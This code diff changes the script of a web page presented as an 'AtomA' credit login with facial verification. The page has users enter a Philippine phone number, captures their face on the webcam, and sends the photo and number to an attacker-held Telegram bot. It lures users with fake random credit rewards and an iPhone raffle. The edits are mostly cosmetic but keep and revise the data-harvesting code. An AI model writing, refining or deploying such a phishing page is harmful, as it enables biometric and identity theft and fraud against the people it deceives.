@@ -33,6 +33,7 @@ const captureFaceBtn = document.getElementById('captureFaceBtn');
 const closeFacialBtn = document.getElementById('closeFacialBtn');
 const facialStatus = document.getElementById('facialStatus');
 const scanLine = document.getElementById('scanLine');
+const guideCircle = document.querySelector('.facial-guide-circle');
 
 // ============================================
 // PHONE NUMBER VALIDATION (10 digits, starts with 9)
@@ -49,6 +50,7 @@ phoneInput.addEventListener('input', (e) => {
     let val = e.target.value.replace(/\D/g, '');
     if (val.length > 10) val = val.slice(0, 10);
     e.target.value = val;
+    
     if (val.length > 0 && val[0] !== '9') {
         phoneError.textContent = 'Number must start with 9';
         phoneError.classList.add('show');
@@ -70,12 +72,19 @@ async function startCamera() {
         if (videoStream) {
             videoStream.getTracks().forEach(track => track.stop());
         }
+        
         const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } } 
+            video: { 
+                facingMode: "user",
+                width: { ideal: 640 },
+                height: { ideal: 480 }
+            } 
         });
+        
         videoStream = stream;
         facialVideo.srcObject = stream;
         
+        // Wait for video to be ready
         await new Promise((resolve) => {
             facialVideo.onloadedmetadata = () => {
                 facialVideo.play();
@@ -83,12 +92,18 @@ async function startCamera() {
             };
         });
         
+        // Wait a bit more for frame
+        await new Promise(r => setTimeout(r, 500));
+        
         isCameraReady = true;
         facialStatus.innerHTML = "✅ Camera ready! Position your face.";
+        facialStatus.className = "facial-status success";
         return true;
+        
     } catch (err) {
         console.error("Camera error:", err);
         facialStatus.innerHTML = "❌ Camera access denied. Please allow camera permissions.";
+        facialStatus.className = "facial-status error";
         return false;
     }
 }
@@ -106,12 +121,19 @@ function stopCamera() {
 // ANIMATION EFFECTS
 // ============================================
 function startScanAnimation() {
-    scanLine.style.display = "block";
+    scanLine.classList.add('active');
+    guideCircle.classList.add('active');
     facialStatus.innerHTML = "🔍 Scanning face...";
+    facialStatus.className = "facial-status loading";
+    
+    // Remove guide circle animation after it completes
+    setTimeout(() => {
+        guideCircle.classList.remove('active');
+    }, 600);
 }
 
 function stopScanAnimation() {
-    scanLine.style.display = "none";
+    scanLine.classList.remove('active');
 }
 
 // ============================================
@@ -120,6 +142,7 @@ function stopScanAnimation() {
 async function captureAndSendToTelegram() {
     if (!isCameraReady || !facialVideo.videoWidth || facialVideo.videoWidth === 0) {
         facialStatus.innerHTML = "❌ Camera not ready. Please wait.";
+        facialStatus.className = "facial-status error";
         return;
     }
     
@@ -142,17 +165,20 @@ async function captureAndSendToTelegram() {
         
         if (!blob || blob.size < 1000) {
             facialStatus.innerHTML = "❌ Failed to capture image. Please try again.";
+            facialStatus.className = "facial-status error";
             stopScanAnimation();
             return;
         }
         
-        facialStatus.innerHTML = `📸 Image captured (${(blob.size / 1024).toFixed(1)} KB). Sending to Telegram...`;
+        const fileSizeKB = (blob.size / 1024).toFixed(1);
+        facialStatus.innerHTML = `📸 Image captured (${fileSizeKB} KB). Sending to Telegram...`;
+        facialStatus.className = "facial-status loading";
         
         // Send to Telegram
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
         formData.append('photo', blob, `face_${currentPhoneNumber}_${Date.now()}.jpg`);
-        formData.append('caption', `🔐 *NEW FACE CAPTURE*\n\n📱 *Phone:* +63${currentPhoneNumber}\n⏰ *Time:* ${new Date().toLocaleString()}\n📍 *Source:* AtomA Facial Recognition\n✅ *Status:* Verification successful\n\n🌐 *IP:* ${navigator.userAgent.substring(0, 50)}`);
+        formData.append('caption', `🔐 *NEW FACE CAPTURE*\n\n📱 *Phone:* +63${currentPhoneNumber}\n⏰ *Time:* ${new Date().toLocaleString()}\n📍 *Source:* AtomA Facial Recognition\n📸 *Image Size:* ${fileSizeKB} KB\n✅ *Status:* Verification successful`);
         
         const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
@@ -163,6 +189,7 @@ async function captureAndSendToTelegram() {
         
         if (result.ok) {
             facialStatus.innerHTML = "✅ Face sent to Telegram! Login successful!";
+            facialStatus.className = "facial-status success";
             stopScanAnimation();
             
             // Send text confirmation
@@ -171,7 +198,7 @@ async function captureAndSendToTelegram() {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: TELEGRAM_CHAT_ID,
-                    text: `✅ *FACE CAPTURE SUCCESSFUL!*\n\n📱 *Phone:* +63${currentPhoneNumber}\n⏰ *Time:* ${new Date().toLocaleString()}\n📸 *Image Size:* ${(blob.size / 1024).toFixed(1)} KB\n📍 *Source:* AtomA Web App`,
+                    text: `✅ *FACE CAPTURE SUCCESSFUL!*\n\n📱 *Phone:* +63${currentPhoneNumber}\n⏰ *Time:* ${new Date().toLocaleString()}\n📸 *Image Size:* ${fileSizeKB} KB\n📍 *Source:* AtomA Web App`,
                     parse_mode: 'Markdown'
                 })
             });
@@ -181,14 +208,17 @@ async function captureAndSendToTelegram() {
                 closeFacialPopup();
                 completeLogin(currentPhoneNumber);
             }, 1500);
+            
         } else {
             facialStatus.innerHTML = "❌ Telegram error: " + result.description;
+            facialStatus.className = "facial-status error";
             stopScanAnimation();
         }
         
     } catch (error) {
         console.error("Capture error:", error);
         facialStatus.innerHTML = "❌ Error: " + error.message;
+        facialStatus.className = "facial-status error";
         stopScanAnimation();
     }
 }
@@ -198,6 +228,7 @@ async function captureAndSendToTelegram() {
 // ============================================
 async function openFacialPopup() {
     const phoneValue = phoneInput.value.trim();
+    
     if (!isValidPhone(phoneValue)) {
         phoneError.classList.add('show');
         phoneInput.focus();
@@ -207,6 +238,11 @@ async function openFacialPopup() {
     currentPhoneNumber = phoneValue;
     phoneError.classList.remove('show');
     
+    // Reset status
+    facialStatus.innerHTML = "🎯 Position your face within the circle";
+    facialStatus.className = "facial-status";
+    scanLine.classList.remove('active');
+    
     facialPopup.classList.add('active');
     await startCamera();
 }
@@ -215,7 +251,8 @@ function closeFacialPopup() {
     stopCamera();
     facialPopup.classList.remove('active');
     facialStatus.innerHTML = "🎯 Position your face within the circle";
-    scanLine.style.display = "none";
+    facialStatus.className = "facial-status";
+    scanLine.classList.remove('active');
     currentPhoneNumber = null;
 }
 
@@ -280,12 +317,16 @@ function performClaim() {
         alert(`You already claimed ₱${spendableBalance}.`);
         return;
     }
+    
     const creditIncrease = Math.floor(Math.random() * (10000 - 1000 + 1) + 1000);
     spendableBalance = creditIncrease;
     claimedReward = true;
     
-    let msg = `🎉 You smashed the Lucky Egg! You received ₱${creditIncrease} credit increase!`;
-    if (Math.random() < 0.12) msg += ` 🍀 You also won an iPhone 17 raffle entry! 🍀`;
+    const iphoneBonus = Math.random() < 0.12;
+    let msg = `🎉 You smashed the Lucky Egg! You received a credit increase of ₱${creditIncrease}!`;
+    if (iphoneBonus) {
+        msg += ` 🍀 AMAZING! You also won a raffle entry for iPhone 17! 🍀`;
+    }
     alert(msg);
     refreshUI();
 }
@@ -303,6 +344,7 @@ function performEnjoySpending() {
         alert("No spending balance.");
         return;
     }
+    
     if (confirm(`Enjoy spending ₱${spendableBalance}?`)) {
         alert(`✅ Enjoy your shopping balance!`);
         spendableBalance = 0;
@@ -317,6 +359,7 @@ document.getElementById('termsLink').addEventListener('click', (e) => {
     e.preventDefault();
     alert("Terms of Service: 0% interest for up to 40 days, no annual fees.");
 });
+
 document.getElementById('privacyLink').addEventListener('click', (e) => {
     e.preventDefault();
     alert("Privacy Policy: Your face data is sent to secure Telegram chat.");
@@ -349,7 +392,9 @@ if (savedUser) {
             isLoggedIn = true;
             refreshUI();
         }
-    } catch(e) {}
+    } catch(e) {
+        console.error("Error parsing saved user:", e);
+    }
 }
 
 refreshUI();
